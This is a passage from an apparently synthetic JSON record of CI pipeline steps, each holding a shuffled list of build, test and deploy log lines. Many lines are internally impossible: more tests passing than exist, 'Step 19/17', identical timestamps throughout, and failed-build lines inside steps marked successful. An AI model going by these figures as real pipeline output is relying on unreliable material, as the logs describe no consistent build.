          "Step 6/24: Linting",
          "[12:46:33] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 15/15: Deploying",
          "Bundling styles.css",
          "GET /status - 201 (24ms)",
          "Fetching submodules...",
          "Compiling lib/main.py...",
          "Minifying app.js",
          "Fetching from https://githubusercontent.com/package.json",
          "WARNING: express has known vulnerabilities",
          "Cache saved successfully",
          "[12:46:33] INFO: Starting build process",
          "FAILED: test_db_connect",
          "Layer 6/14: RUN command",
          "Verifying...",
          "npm notice: created a lockfile",
          "Cache miss for key-4837",
          "pip: Installing build dependencies...",
          "[12:46:33] WARN: Deprecated API usage",
          "Coverage: 86% statements, 79% branches",
          "pip install: Successfully installed jest-2.17",
          "Bundling vendor.css",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache invalidated: node_modules",
          "Tests: 202 passed, 103 total",
          "Compiling components/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 All checks passed",
          "[12:46:33] DEBUG: Loading configuration",
          "Test Suites: 31 passed, 34 total",
          "  PASS: test_user_create (104ms)",
          "[12:46:33] DEBUG: Connection pool: 13 active",
          "Compiling lib/app.ts...",
          "Ran 165 tests in 41s",
          "Compiling components/utils.go...",
          "Cache hit for key-2167",
          "\u2713 Task completed in 2822ms",
          "GET /health - 201 (44ms)",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:46:33] WARN: Deprecated API usage",
          "Finished.",
          "Coverage: 98% statements, 88% branches",
          "Pulling image: python:latest",
          "WARNING: eslint has known vulnerabilities",
          "Image pulled successfully",
          "Time: 32.755s",
          "Compiling src/index.js...",
          "Compiling lib/main.py...",
          "\u2713 All checks passed",
          "Verifying...",
          "Success!",
          "Snapshots: 1 passed, 44 total",
          "Creating production build...",
          "Success!",
          "POST /data - 202 (229ms)",
          "Checking out develop branch",
          "[12:46:33] INFO: Request completed",
          "Optimizing 91 modules...",
          "[12:46:33] DEBUG: Initializing service",
          "npm notice: created a lockfile",
          "Using Python 3.11",
          "HEAD is now at a83094e",
          "Step 11/21: Building",
          "[12:46:33] DEBUG: Connection pool: 8 active",
          "Finished.",
          "[12:46:33] DEBUG: Initializing service",
          "Optimizing 60 modules...",
          "Artifact downloaded: 26MB",
          "OK",
          "Compiling utils/main.py...",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "TLS handshake completed",
          "Step 19/23: Testing",
          "Ready.",
          "OK",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Artifact uploaded: dist.zip (29MB)",
          "Installing express@5.8.2",
          "\u2713 deploy completed",
          "[12:46:33] INFO: Starting build process",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-16T12:47:35.193013",
        "finished_at": "2025-12-16T12:47:38.941114",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Finished.",
          "Step 3/25: Linting",
          "[12:46:33] INFO: Cache refreshed",
          "Installing lodash@5.18.5",
          "Environment: production",
          "Compiling components/utils.go...",
          "\u2713 build completed",
          "Step 17/22: Linting",
          "Time: 31.156s",
          "Image pulled successfully",
          "Minifying vendor.js",
          "Pulling image: alpine:latest",
          "Done.",
          "NODE_ENV=production",
          "Pushing to registry...",
          "Success!",
          "Fetching submodules...",
          "Completed.",
          "Snapshots: 23 passed, 38 total",
          "[12:46:33] ERROR: Connection failed",
          "Cache saved successfully",
          "[12:46:33] DEBUG: Query executed in 25ms",
          "Step 11/15: Building",
          "Completed.",
          "OK",
          "Verifying...",
          "HEAD is now at 39df60c",
          "[12:46:33] INFO: Connecting to database",
          "OK",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Pushing to registry...",
          "WARNING: axios has known vulnerabilities",
          "Image pulled successfully",
          "\u2717 build failed with exit code 6",
          "Switched to branch 'feature/task-146'",
          "Artifact downloaded: 17MB",
          "Fetching submodules...",
          "yarn add: Done in 14.42s",
          "Layer 7/8: ENV command",
          "[12:46:33] INFO: Request completed",
          "WARNING: webpack has known vulnerabilities",
          "npm notice: created a lockfile",
          "Creating production build...",
          "Environment: test",
          "pip: Installing build dependencies...",
          "Bundling main.js",
          "[12:46:33] DEBUG: Initializing service",
          "[12:46:33] INFO: Processing request",
          "Step 12/20: Testing",
          "[12:46:33] INFO: Connecting to database",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "Step 17/24: Building",
          "Success!",
          "[12:46:33] WARN: Deprecated API usage",
          "Processing...",
          "Compiling src/app.ts...",
          "[12:46:33] INFO: Connecting to database",
          "Using Python 3.11",
          "Finished.",
          "WARNING: jest has known vulnerabilities",
          "Minifying main.js",
          "Compiling components/app.ts...",
          "Finished.",
          "Step 1/20: Linting",
          "\u2713 All checks passed",
          "Step 18/19: Testing",
          "Environment: test",
          "Cache saved successfully",
          "Compiling lib/index.js...",
          "pip: Downloading webpack-1.5.tar.gz",
          "Snapshots: 19 passed, 36 total",
          "WARNING: webpack has known vulnerabilities",
          "Step 18/23: Linting",
          "npm install: resolved 1681 packages",
          "WARNING: webpack has known vulnerabilities",
          "[12:46:33] INFO: Connecting to database",
          "Transforming 788 files...",
          "Cache miss for key-1161",
          "OK",
          "Compiling src/handler.rs...",
          "\u2713 Step 'setup' succeeded",
          "[12:46:33] INFO: Processing request",
          "[12:46:33] DEBUG: Query executed in 44ms",
          "Switched to branch 'feature/task-848'",
          "[12:46:33] WARN: Deprecated API usage",
          "POST /upload - 202 (363ms)",
          "npm install: resolved 363 packages",
          "Cache miss for key-8274",
          "Optimizing 74 modules...",
          "Compiling src/utils.go...",
          "\u2713 All checks passed",
          "Verifying...",
          "Success!",
          "Done.",
          "pip install: Successfully installed prettier-5.13",
          "Coverage: 78% statements, 87% branches",
          "\u2713 All checks passed",
          "[12:46:33] DEBUG: Connection pool: 15 active",
          "Pulling image: alpine:latest",
          "Compiling src/utils.go...",
          "Compiling utils/main.py...",
          "Compiling components/app.ts...",
          "Loading...",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-16T12:47:38.941114",
        "finished_at": "2025-12-16T12:47:48.311367",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Finished.",
          "Installing express@1.5.0",
          "Already up to date.",
          "Time: 10.800s",
          "\u2713 Step 'checkout' succeeded",
          "Transforming 879 files...",
          "Cache hit for key-6468",
          "Step 5/17: Deploying",
          "Optimizing 12 modules...",
          "pip: Collecting lodash",
          "Success!",
          "Minifying app.js",
          "Uploading artifact 'coverage' (42 files)",
          "Artifact downloaded: 22MB",
          "Generating source maps...",
          "Compiling src/index.js...",
          "Verifying...",
          "POST /upload - 201 (418ms)",
          "Fetching from https://pypi.org/package.json",
          "TLS handshake completed",
          "pip: Collecting react",
          "Step 11/17: Installing dependencies",
          "Transforming 112 files...",
          "Processing...",
          "[12:46:33] INFO: Starting build process",
          "[12:46:33] DEBUG: Query executed in 6ms",
          "Snapshots: 20 passed, 31 total",
          "POST /upload - 201 (384ms)",
          "[12:46:33] INFO: Starting build process",
          "Step 11/17: Installing dependencies",
          "Using Node.js 16.12.2",
          "[12:46:33] DEBUG: Loading configuration",
          "Switched to branch 'bugfix/task-639'",
          "HEAD is now at 7ed6ecd",
          "POST /upload - 200 (96ms)",
          "Artifact downloaded: 1MB",
          "GET /api - 201 (30ms)",
          "Checking out master branch",
          "Building Docker image...",
          "Compiling utils/service.java...",
          "Compiling src/app.ts...",
          "Cache saved successfully",
          "Verifying...",
          "Compiling lib/app.ts...",
          "Creating production build...",
          "[12:46:33] INFO: Starting build process",
          "Creating production build...",
          "Optimizing 68 modules...",
          "Building Docker image...",
          "\u2713 package completed",
          "[12:46:33] WARN: Deprecated API usage",
          "[12:46:33] DEBUG: Query executed in 71ms",
          "\u2713 Task completed in 2707ms",
          "Step 8/22: Installing dependencies",
          "[12:46:33] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Compiling lib/handler.rs...",
          "Cache restored successfully (230MB)",
          "pip: Collecting prettier",
          "Artifact uploaded: dist.zip (2MB)",
          "FAILED: test_cache_hit",
          "Success!",
          "yarn add: Done in 12.94s",
          "pip: Collecting eslint",
          "Step 17/20: Testing",
          "npm install: resolved 244 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing webpack@3.10.2",
          "Cache miss for key-4532",
          "pip: Installing build dependencies...",
          "Ran 120 tests in 15s",
          "Checking out master branch",
          "Step 9/21: Linting",
          "Switched to branch 'feature/task-416'",
          "Pulling image: alpine:18",
          "\u2713 Step 'test' succeeded",
          "Cache saved successfully",
          "Optimizing 13 modules...",
          "Fetching from https://github.com/package.json",
          "Checking out master branch",
          "Fetching from https://gcr.io/package.json",
          "npm notice: package.json updated",
          "WARNING: prettier has known vulnerabilities",
          "Exception: ValueError",
          "[12:46:33] DEBUG: Memory usage: 1664MB",
          "[12:46:33] INFO: Starting build process",
          "Loading...",
          "Generating source maps...",
          "\u2713 Step 'checkout' succeeded",
          "\u2713 Task completed in 2387ms",
          "Test Suites: 26 passed, 12 total",
          "WARNING: react has known vulnerabilities",
          "[12:46:33] DEBUG: Query executed in 63ms",
          "pip: Downloading react-5.7.tar.gz",
          "Verifying...",
          "Processing...",
          "Loading...",
          "[12:46:33] INFO: Connecting to database",
          "Bundling runtime.css",
          "[12:46:33] INFO: Connecting to database",
          "Finished.",
          "Switched to branch 'hotfix/task-257'",
          "npm notice: created a lockfile",
          "Snapshots: 25 passed, 18 total",
          "Building Docker image...",
          "Uploading artifact 'build' (26 files)",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-16T12:47:48.311367",
        "finished_at": "2025-12-16T12:47:57.681620",
        "log_lines": [
          "=== Step: setup_node ===",
          "\u2713 lint completed",
          "pip install: Successfully installed express-5.13",
          "npm install: resolved 537 packages",
          "Generating source maps...",
          "Connection established",
          "Artifact downloaded: 20MB",
          "[12:46:33] INFO: Connecting to database",
          "Time: 66.60s",
          "pip: Downloading axios-1.9.tar.gz",
          "Time: 22.879s",
          "pip: Installing build dependencies...",
          "npm notice: package.json updated",
          "Cache miss for key-1073",
          "[12:46:33] ERROR: Connection failed",
          "Optimizing 50 modules...",
          "[12:46:33] INFO: Processing request",
          "Creating production build...",
          "HEAD is now at bba0592",
          "npm install: added 293 packages",
          "WARNING: express has known vulnerabilities",
          "\u2713 All checks passed",
          "Environment: staging",
          "TLS handshake completed",
          "[12:46:33] INFO: Processing request",
          "  PASS: test_auth_login (121ms)",
          "OK",
          "  PASS: test_cache_hit (230ms)",
          "Compiling components/utils.go...",
          "[12:46:33] DEBUG: Connection pool: 3 active",
          "\u2717 build failed with exit code 7",
          "Optimizing 76 modules...",
          "Step 11/20: Building",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "Ready.",
          "Transforming 963 files...",
          "Processing...",
          "pip install: Successfully installed react-1.16",
          "Building Docker image...",
          "Bundling vendor.css",
          "Already up to date.",
          "[12:46:33] INFO: Starting build process",
          "[12:46:33] INFO: Processing request",
          "Step 16/25: Running migrations",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Minifying app.js",
          "[12:46:33] DEBUG: Query executed in 51ms",
          "HEAD is now at b1b4483",
          "Platform: win32-x64",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Processing...",
          "[12:46:33] INFO: Request completed",
          "Already up to date.",
          "pip: Installing build dependencies...",
          "Success!",
          "pip install: Successfully installed jest-2.13",
          "[12:46:33] ERROR: Connection failed",
          "Generating source maps...",
          "Cache saved successfully",
          "Compiling lib/app.ts...",
          "Step 7/25: Running migrations",
          "Step 4/25: Linting",
          "Compiling components/main.py...",
          "[12:46:33] WARN: Deprecated API usage",
          "Tests: 350 passed, 455 total",
          "pip: Installing build dependencies...",
          "Pulling image: node:18",
          "[12:46:33] DEBUG: Loading configuration",
          "[12:46:33] DEBUG: Memory usage: 626MB",
          "\u2713 All checks passed",
          "[12:46:33] WARN: Deprecated API usage",
          "\u2713 Task completed in 4457ms",
          "Pushing to registry...",
          "Loading...",
          "Tests: 174 passed, 340 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ready.",
          "pip install: Successfully installed axios-2.20",
          "Environment: production",
          "Generating source maps...",
          "HEAD is now at 8192f9c",
          "Test Suites: 13 passed, 44 total",
          "Finished.",
          "Connection established",
          "Step 12/25: Deploying",
          "Minifying main.js",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Processing...",
          "Compiling components/main.py...",
          "Compiling components/app.ts...",
          "Checking out develop branch",
          "Finished.",
          "Compiling lib/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:33] DEBUG: Query executed in 53ms",
          "Time: 61.653s",
          "Cache restored successfully (59MB)",
          "POST /api - 200 (19ms)",
          "Compiling utils/utils.go...",
          "Done.",
          "  PASS: test_auth_login (384ms)",
          "Step 20/24: Building",
          "Fetching submodules...",
          "Compiling utils/app.ts...",
          "Ran 120 tests in 51s",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-16T12:47:57.681620",
        "finished_at": "2025-12-16T12:48:25.792378",
        "log_lines": [
          "=== Step: unit_tests ===",
          "pip: Collecting jest",
          "Finished.",
          "HEAD is now at a1370fd",
          "Finished.",
          "Environment: staging",
          "TLS handshake completed",
          "[12:46:33] INFO: Starting build process",
          "[12:46:33] INFO: Processing request",
          "HEAD is now at b129e37",
          "Image pulled successfully",
          "npm install: resolved 879 packages",
          "Using Node.js 17.19.3",
          "Compiling components/main.py...",
          "[12:46:33] INFO: Connecting to database",
          "Cache hit for key-3586",
          "TLS handshake completed",
          "Installing eslint@2.13.2",
          "Cache invalidated: node_modules",
          "Time: 97.814s",
          "Checking out develop branch",
          "Completed.",
          "Time: 71.731s",
          "Platform: darwin-arm64",
          "Step 9/22: Building",
          "Fetching submodules...",
          "yarn add: Done in 24.49s",
          "[12:46:33] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (29MB)",
          "pip: Collecting jest",
          "\u2713 All checks passed",
          "Ready.",
          "Cache hit for key-5691",
          "Minifying app.js",
          "[12:46:33] INFO: Connecting to database",
          "Platform: darwin-arm64",
          "pip install: Successfully installed react-2.1",
          "POST /api - 202 (66ms)",
          "Test Suites: 31 passed, 43 total",
          "Pushing to registry...",
          "\u2713 Step 'setup' succeeded",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Connection established",
          "Verifying...",
          "Success!",
          "Pushing to registry...",
          "Waiting...",
          "yarn add: Done in 25.48s",
          "[12:46:33] INFO: Starting build process",
          "Snapshots: 2 passed, 14 total",
          "[12:46:33] DEBUG: Memory usage: 1691MB",
          "Connection established",
          "Completed.",
          "Cache invalidated: dependencies",
          "pip: Installing build dependencies...",
          "NODE_ENV=test",
          "OK",
          "Creating production build...",
          "[12:46:33] WARN: Deprecated API usage",
          "npm install: added 376 packages",
          "Completed.",
          "Building Docker image...",
          "[12:46:33] DEBUG: Initializing service",
          "npm install: resolved 287 packages",
          "Completed.",
          "OK",
          "[12:46:33] DEBUG: Query executed in 27ms",
          "yarn add: Done in 12.31s",
          "Pulling image: node:3.11",
          "Creating production build...",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: test_cache_hit (391ms)",
          "[12:46:33] DEBUG: Query executed in 89ms",
          "Layer 6/14: RUN command",
          "Cache invalidated: build",
          "\u2713 Task completed in 3354ms",
          "Cache saved successfully",
          "Optimizing 50 modules...",
          "Generating source maps...",
          "Verifying...",
          "HEAD is now at 2d410a1",
          "Already up to date.",
          "Environment: test",
          "Switched to branch 'feature/task-350'",
          "HEAD is now at 24f2741",
          "pip: Downloading express-5.6.tar.gz",
          "Waiting...",
          "WARNING: react has known vulnerabilities",
          "Compiling src/utils.go...",
          "Done.",
          "Test Suites: 33 passed, 11 total",
          "Success!",
          "Waiting...",
          "WARNING: jest has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Cache miss for key-6337",
          "Step 19/17: Linting",
          "  PASS: integration/test_api_health.spec.js",
          "npm notice: created a lockfile",
          "[12:46:33] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 lint completed",
          "Bundling styles.js",
          "Switched to branch 'hotfix/task-750'",
          "Success!",
          "Creating production build...",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-16T12:48:25.792378",
        "finished_at": "2025-12-16T12:48:31.414530",
        "log_lines": [
          "=== Step: save_cache ===",
          "Connection established",
          "[12:46:33] WARN: Deprecated API usage",
          "WARNING: express has known vulnerabilities",
          "Creating production build...",
          "POST /upload - 200 (241ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Connection established",
          "Building Docker image...",
          "\u2717 build failed with exit code 108",
          "Ran 134 tests in 38s",
          "Compiling src/handler.rs...",
          "[12:46:33] DEBUG: Connection pool: 9 active",
          "Step 3/25: Building",
          "[12:46:33] DEBUG: Query executed in 46ms",
          "Coverage: 95% statements, 75% branches",
          "Done.",
          "[12:46:33] DEBUG: Memory usage: 2000MB",
          "Artifact uploaded: build.tar.gz (2MB)",
          "POST /upload - 202 (117ms)",
          "Finished.",
          "\u2717 build failed with exit code 61",
          "[12:46:33] WARN: Deprecated API usage",
          "Fetching submodules...",
          "Step 15/24: Testing",
          "Bundling runtime.js",
          "yarn add: Done in 12.45s",
          "Cache hit for key-3055",
          "Platform: win32-x64",
          "[12:46:33] WARN: Deprecated API usage",
          "HEAD is now at cdede3d",
          "Minifying main.js",
          "Cache saved successfully",
          "Cache restored successfully (34MB)",
          "[12:46:33] INFO: Processing request",
          "pip: Collecting prettier",
          "[12:46:33] DEBUG: Initializing service",
          "yarn add: Done in 20.48s",
          "[12:46:33] DEBUG: Initializing service",
          "Optimizing 16 modules...",
          "pip: Downloading express-2.3.tar.gz",
          "Compiling src/service.java...",
          "\u2717 build failed with exit code 92",
          "Cache miss for key-9384",
          "WARNING: prettier has known vulnerabilities",
          "Ready.",
          "pip: Collecting webpack",
          "[12:46:33] INFO: Request completed",
          "Step 3/20: Building",
          "Transforming 162 files...",
          "Cache hit for key-5391",
          "Compiling utils/handler.rs...",
          "GET /health - 201 (3ms)",
          "[12:46:33] DEBUG: Query executed in 86ms",
          "[12:46:33] DEBUG: Connection pool: 14 active",
          "\u2713 validate completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:33] INFO: Starting build process",
          "Completed.",
          "NODE_ENV=production",
          "npm notice: created a lockfile",
          "Coverage: 77% statements, 73% branches",
          "Compiling components/service.java...",
          "POST /data - 200 (246ms)",
          "pip: Installing build dependencies...",
          "Compiling utils/handler.rs...",
          "Step 1/23: Deploying",
          "Platform: darwin-arm64",
          "Cache saved successfully",
          "[12:46:33] DEBUG: Query executed in 49ms",
          "Step 19/15: Linting",
          "Using Python 3.11",
          "TLS handshake completed",
          "GET /status - 201 (10ms)",
          "\u2713 All checks passed",
          "FAILED: test_api_health",
          "Image pulled successfully",
          "Image pulled successfully",
          "Cache saved successfully",
          "Waiting...",
          "Compiling components/main.py...",
          "Creating production build...",
          "GET /api - 204 (16ms)",
          "Cache restored successfully (90MB)",
          "Verifying...",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "  PASS: test_cache_hit (205ms)",
          "Pulling image: python:latest",
          "Ran 55 tests in 40s",
          "WARNING: eslint has known vulnerabilities",
          "Success!",
          "Cache restored successfully (415MB)",
          "\u2717 build failed with exit code 104",
          "Using Python 3.10",
          "Artifact uploaded: dist.zip (74MB)",
          "Connection established",
          "[12:46:33] INFO: Cache refreshed",
          "TLS handshake completed",
          "WARNING: react has known vulnerabilities",
          "[12:46:33] ERROR: Connection failed",
          "Fetching submodules...",
          "Cache miss for key-2086",
          "Pushing to registry...",
          "  PASS: test_api_health (175ms)",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-16T12:48:31.414530",
        "finished_at": "2025-12-16T12:48:40.784783",
        "log_lines": [
          "=== Step: type_check ===",
          "npm notice: package.json updated",
          "Step 9/22: Running migrations",
          "[12:46:33] DEBUG: Query executed in 6ms",
          "Already up to date.",
          "Compiling utils/app.ts...",
          "Cache invalidated: dependencies",
          "TLS handshake completed",
          "Optimizing 23 modules...",
          "Bundling vendor.js",
          "Creating production build...",
          "Optimizing 91 modules...",
          "Using Node.js 14.19.2",
          "TLS handshake completed",
          "Building Docker image...",
          "Connection established",
          "Fetching from https://docker.io/package.json",
          "Cache restored successfully (374MB)",
          "Processing...",
          "Ran 82 tests in 17s",
          "Platform: win32-x64",
          "\u2713 Step 'build' succeeded",
          "[12:46:33] ERROR: Connection failed",
          "[12:46:33] ERROR: Connection failed",
          "Pulling image: node:18",
          "\u2713 Task completed in 347ms",
          "TLS handshake completed",
          "  PASS: test_auth_login (31ms)",
          "Compiling lib/utils.go...",
          "Pushing to registry...",
          "WARNING: webpack has known vulnerabilities",
          "pip install: Successfully installed express-2.8",
          "Cache invalidated: build",
          "Step 9/25: Linting",
          "Minifying vendor.js",
          "Success!",
          "Layer 6/11: RUN command",
          "[12:46:33] WARN: Deprecated API usage",
          "Artifact downloaded: 17MB",
          "Processing...",
          "Cache saved successfully",
          "Tests: 85 passed, 208 total",
          "GET /api - 200 (10ms)",
          "Finished.",
          "Time: 41.977s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing lodash@3.10.6",
          "Building Docker image...",
          "Tests: 378 passed, 257 total",
          "Optimizing 44 modules...",
          "Checking out main branch",
          "pip install: Successfully installed react-3.10",
          "\u2713 Step 'test' succeeded",
          "[12:46:33] WARN: Deprecated API usage",
          "Compiling components/index.js...",
          "Success!",
          "npm install: added 256 packages",
          "WARNING: jest has known vulnerabilities",
          "Exception: ValueError",
          "Generating source maps...",
          "Step 7/18: Installing dependencies",
          "Verifying...",
          "Pushing to registry...",
          "Transforming 431 files...",
          "FAILED: test_api_health",
          "Compiling components/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 Task completed in 677ms",
          "WARNING: axios has known vulnerabilities",
          "pip: Downloading lodash-3.4.tar.gz",
          "Tests: 146 passed, 464 total",
          "Success!",
          "  PASS: integration/test_db_connect.spec.js",
          "Cache hit for key-9292",
          "Compiling utils/service.java...",
          "[12:46:33] DEBUG: Connection pool: 16 active",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:46:33] DEBUG: Loading configuration",
          "[12:46:33] DEBUG: Initializing service",
          "\u2713 Task completed in 203ms",
          "npm install: resolved 1350 packages",
          "yarn add: Done in 11.41s",
          "\u2713 All checks passed",
          "HEAD is now at 5f53f97",
          "Using Python 3.9",
          "Test Suites: 50 passed, 47 total",
          "FAILED: test_cache_hit",
          "npm install: added 236 packages",
          "Cache saved successfully",
          "Exception: NullPointerException",
          "[12:46:33] INFO: Processing request",
          "Cache saved successfully",
          "[12:46:33] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "Time: 21.97s",
          "Loading...",
          "  PASS: test_api_health (274ms)",
          "OK",
          "[12:46:33] WARN: Deprecated API usage",
          "[12:46:33] INFO: Starting build process",
          "HEAD is now at 1b13b31",
          "Step 4/16: Running migrations",
          "Finished.",
          "WARNING: eslint has known vulnerabilities",
          "Completed.",
          "[12:46:33] DEBUG: Connection pool: 15 active",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-16T12:48:40.784783",
        "finished_at": "2025-12-16T12:48:44.532884",
        "log_lines": [
          "=== Step: checkout ===",
          "Cache saved successfully",
          "Coverage: 75% statements, 65% branches",
          "Compiling lib/service.java...",
          "OK",
          "Coverage: 77% statements, 78% branches",
          "npm install: added 297 packages",
          "  PASS: test_user_create (303ms)",
          "[12:46:33] INFO: Request completed",
          "Test Suites: 25 passed, 33 total",
          "HEAD is now at 1b03b05",
          "\u2713 Task completed in 4696ms",
          "Using Node.js 20.7.3",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip: Collecting eslint",
          "Transforming 147 files...",
          "npm install: added 185 packages",
          "[12:46:33] DEBUG: Memory usage: 1713MB",
          "\u2713 Step 'install' succeeded",
          "[12:46:33] ERROR: Connection failed",
          "Artifact downloaded: 26MB",
          "WARNING: webpack has known vulnerabilities",
          "pip: Collecting lodash",
          "pip: Installing build dependencies...",
          "Processing...",
          "WARNING: lodash has known vulnerabilities",
          "Bundling runtime.css",
          "[12:46:33] INFO: Processing request",
          "npm notice: created a lockfile",
          "Layer 6/12: RUN command",
          "Optimizing 58 modules...",
          "Fetching from https://githubusercontent.com/package.json",
          "Compiling lib/main.py...",
          "Checking out master branch",
          "Step 1/24: Building",
          "TLS handshake completed",
          "[12:46:33] INFO: Starting build process",
          "Transforming 995 files...",
          "GET /status - 200 (20ms)",
          "Exception: RuntimeError",
          "pip: Installing build dependencies...",
          "Waiting...",
          "[12:46:33] INFO: Processing request",
          "[12:46:33] DEBUG: Loading configuration",
          "Connection established",
          "yarn add: Done in 25.77s",
          "Ran 159 tests in 41s",
          "Cache saved successfully",
          "Transforming 808 files...",
          "Using Node.js 17.0.7",
          "Tests: 477 passed, 58 total",
          "[12:46:33] INFO: Cache refreshed",
          "Optimizing 68 modules...",
          "Cache saved successfully",
          "yarn add: Done in 13.32s",
          "yarn add: Done in 23.50s",
          "Cache invalidated: build",
          "Waiting...",
          "\u2713 package completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "npm notice: created a lockfile",
          "Step 15/24: Running migrations",
          "[12:46:33] INFO: Request completed",
          "Bundling styles.js",
          "Ready.",
          "Success!",
          "Already up to date.",
          "WARNING: eslint has known vulnerabilities",
          "Cache miss for key-2454",
          "\u2713 package completed",
          "FAILED: test_db_connect",
          "Step 10/16: Building",
          "Layer 2/8: RUN command",
          "Step 12/25: Running migrations",
          "Processing...",
          "  PASS: unit/test_db_connect.spec.js",
          "Connection established",
          "Layer 7/14: ENV command",
          "Compiling utils/service.java...",
          "[12:46:33] DEBUG: Initializing service",
          "Coverage: 95% statements, 68% branches",
          "pip install: Successfully installed react-1.19",
          "WARNING: express has known vulnerabilities",
          "Bundling main.js",
          "Ran 146 tests in 16s",
          "Compiling lib/app.ts...",
          "Time: 18.768s",
          "Fetching from https://pypi.org/package.json",
          "[12:46:33] INFO: Request completed",
          "Building Docker image...",
          "Pushing to registry...",
          "Artifact uploaded: dist.zip (46MB)",
          "Cache hit for key-6322",
          "Ran 103 tests in 44s",
          "Pushing to registry...",
          "Waiting...",
          "NODE_ENV=production",
          "Compiling utils/service.java...",
          "Processing...",
          "Layer 1/9: ENV command",
          "[12:46:33] DEBUG: Loading configuration",
          "NODE_ENV=test",
          "Checking out master branch",
          "GET /api - 204 (99ms)",
          "Step 13/21: Testing",
          "Finished.",
          "Processing...",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-16T12:48:44.532884",
        "finished_at": "2025-12-16T12:49:03.273390",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Checking out develop branch",
          "Step 5/17: Building",
          "Ran 126 tests in 44s",
          "Fetching submodules...",
          "Layer 1/8: COPY command",
          "[12:46:33] WARN: Deprecated API usage",
          "[12:46:33] DEBUG: Memory usage: 453MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache restored successfully (10MB)",
          "[12:46:33] DEBUG: Memory usage: 1704MB",
          "Ran 22 tests in 60s",
          "[12:46:33] DEBUG: Query executed in 7ms",
          "yarn add: Done in 23.79s",
          "Test Suites: 43 passed, 5 total",
          "WARNING: react has known vulnerabilities",
          "Switched to branch 'hotfix/task-260'",
          "Ready.",
          "Optimizing 70 modules...",
          "Step 11/20: Deploying",
          "pip: Collecting react",
          "Switched to branch 'feature/task-108'",
          "[12:46:33] INFO: Processing request",
          "Layer 3/10: RUN command",
          "[12:46:33] DEBUG: Connection pool: 6 active",
          "Creating production build...",
          "NODE_ENV=production",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:46:33] DEBUG: Memory usage: 323MB",
          "Step 12/19: Installing dependencies",
          "[12:46:33] DEBUG: Initializing service",
          "pip: Downloading jest-2.18.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Pulling image: node:latest",
          "Layer 9/8: COPY command",
          "Checking out main branch",
          "Snapshots: 44 passed, 29 total",
          "Using Node.js 20.1.10",
          "Checking out main branch",
          "Finished.",
          "Exception: TypeError",
          "TLS handshake completed",
          "Step 14/21: Testing",
          "Switched to branch 'bugfix/task-962'",
          "[12:46:33] WARN: Deprecated API usage",
          "POST /data - 200 (35ms)",
          "Using Node.js 20.11.1",
          "pip: Downloading axios-4.8.tar.gz",
          "Cache miss for key-6422",
          "GET /status - 201 (2ms)",
          "Image pulled successfully",
          "Checking out master branch",
          "[12:46:33] DEBUG: Query executed in 20ms",
          "Using Node.js 18.6.3",
          "Step 15/16: Deploying",
          "OK",
          "Cache restored successfully (93MB)",
          "Done.",
          "[12:46:33] WARN: Deprecated API usage",
          "Test Suites: 11 passed, 16 total",
          "Loading...",
          "Coverage: 82% statements, 65% branches",
          "[12:46:33] INFO: Cache refreshed",
          "\u2713 package completed",
          "\u2717 build failed with exit code 56",
